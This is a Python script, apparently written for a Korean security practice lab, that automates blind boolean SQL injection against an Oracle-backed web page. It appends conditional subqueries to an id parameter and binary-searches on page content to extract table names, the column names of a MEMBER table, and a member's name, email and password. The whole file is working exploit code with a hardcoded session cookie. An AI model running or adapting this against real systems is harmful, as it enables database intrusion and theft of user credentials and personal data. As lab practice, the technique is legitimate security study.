import requests

주소 = "https://lab.eqst.co.kr:8110/practice/practice01/detail?id=61"
쿠키 = {
    "JSESSIONID": "C0524C862C6367363741E7DF8C6329FF"
}

def 값찾기(쿼리, 시작=0, 끝=65535):
    """Blind SQL 이진탐색"""
    s, e = 시작, 끝
    while s < e:
        m = (s + e) // 2
        공격쿼리 = f"({쿼리}) > {m}"
        공격주소 = 주소 + " and " + 공격쿼리
        응답 = requests.get(url=공격주소, cookies=쿠키)
        if "애플워치" in 응답.text:
            s = m + 1
        else:
            e = m
    return e


# ----------------------------------------
# ① 테이블명 추출
# ----------------------------------------
공격쿼리 = "select count(table_name) from user_tables"
테이블개수 = 값찾기(공격쿼리, 시작=0, 끝=2000)
print(f"테이블 개수 : {테이블개수}개\n")

테이블리스트 = []
for rownum in range(1, 테이블개수 + 1):
    공격쿼리 = f"select length(a) from (select table_name a, rownum b from user_tables) where b = {rownum}"
    글자수 = 값찾기(공격쿼리, 시작=0, 끝=255)
    이름_chars = []
    for idx in range(1, 글자수 + 1):
        공격쿼리 = f"select ascii(substr(a,{idx},1)) from (select table_name a, rownum b from user_tables) where b = {rownum}"
        val = 값찾기(공격쿼리, 시작=0, 끝=127)
        이름_chars.append(chr(val))
    테이블명 = "".join(이름_chars)
    print(f"{rownum}번째 테이블명: {테이블명}")
    테이블리스트.append(테이블명)


# ----------------------------------------
# ② MEMBER 테이블 컬럼명 추출
# ----------------------------------------
if "MEMBER" in 테이블리스트:
    print("\n[MEMBER 테이블 컬럼명 추출 시작]")
    공격쿼리 = "select count(column_name) from user_tab_columns where table_name='MEMBER'"
    컬럼개수 = 값찾기(공격쿼리, 시작=0, 끝=1000)
    print(f"컬럼 개수 : {컬럼개수}개\n")

    컬럼리스트 = []
    for rownum in range(1, 컬럼개수 + 1):
        공격쿼리 = f"select length(a) from (select column_name a, rownum b from user_tab_columns where table_name='MEMBER') where b={rownum}"
        글자수 = 값찾기(공격쿼리, 시작=0, 끝=255)
        이름_chars = []
        for idx in range(1, 글자수 + 1):
            공격쿼리 = f"select ascii(substr(a,{idx},1)) from (select column_name a, rownum b from user_tab_columns where table_name='MEMBER') where b={rownum}"
            val = 값찾기(공격쿼리, 시작=0, 끝=127)
            이름_chars.append(chr(val))
        컬럼명 = "".join(이름_chars)
        print(f"{rownum}번째 컬럼명: {컬럼명}")
        컬럼리스트.append(컬럼명)
else:
    print("\nMEMBER 테이블이 존재하지 않습니다.")


# ----------------------------------------
# ③ MEMBER 테이블에서 여러 컬럼 1행만 추출
# ----------------------------------------
print("\n[MEMBER 테이블에서 여러 컬럼 1행 데이터 추출]")

# ✅ 원하는 컬럼들을 리스트로 지정 (이 순서대로 출력됨)
선택컬럼들 = ["NAME", "EMAIL", "PASSWORD", "NAME"]

rownum = 1
결과리스트 = []

for 컬럼선택 in 선택컬럼들:
    if 컬럼선택 not in 컬럼리스트:
        결과리스트.append(f"{컬럼선택}=<존재하지 않음>")
        continue

    # NAME은 UTF-8 (한글), 나머지는 ASCII
    if 컬럼선택.upper() == "NAME":
        공격쿼리 = f"select lengthb({컬럼선택}) from (select {컬럼선택}, rownum r from MEMBER) where r={rownum}"
        바이트길이 = 값찾기(공격쿼리, 시작=0, 끝=4000)
        byte_list = []
        for idx in range(1, 바이트길이 + 1):
            공격쿼리 = (
                f"select to_number(substr(rawtohex(utl_i18n.string_to_raw({컬럼선택},'AL32UTF8')),"
                f"{(idx-1)*2 + 1},2),'XX') "
                f"from (select {컬럼선택}, rownum r from MEMBER) where r={rownum}"
            )
            b = 값찾기(공격쿼리, 시작=0, 끝=255)
            byte_list.append(b)
        try:
            decoded = bytes(byte_list).decode("utf-8", errors="replace")
        except:
            decoded = "(디코딩 실패)"
        결과리스트.append(f"{컬럼선택}={decoded}")

    else:
        공격쿼리 = f"select length({컬럼선택}) from (select {컬럼선택}, rownum r from MEMBER) where r={rownum}"
        글자수 = 값찾기(공격쿼리, 시작=0, 끝=255)
        결과 = ""
        for i in range(1, 글자수 + 1):
            공격쿼리 = f"select ascii(substr({컬럼선택},{i},1)) from (select {컬럼선택}, rownum r from MEMBER) where r={rownum}"
            a = 값찾기(공격쿼리, 시작=0, 끝=127)
            결과 += chr(a)
        결과리스트.append(f"{컬럼선택}={결과}")

# ✅ 한 줄로 출력
print("\n▶ 1행 데이터:")
print(" | ".join(결과리스트))
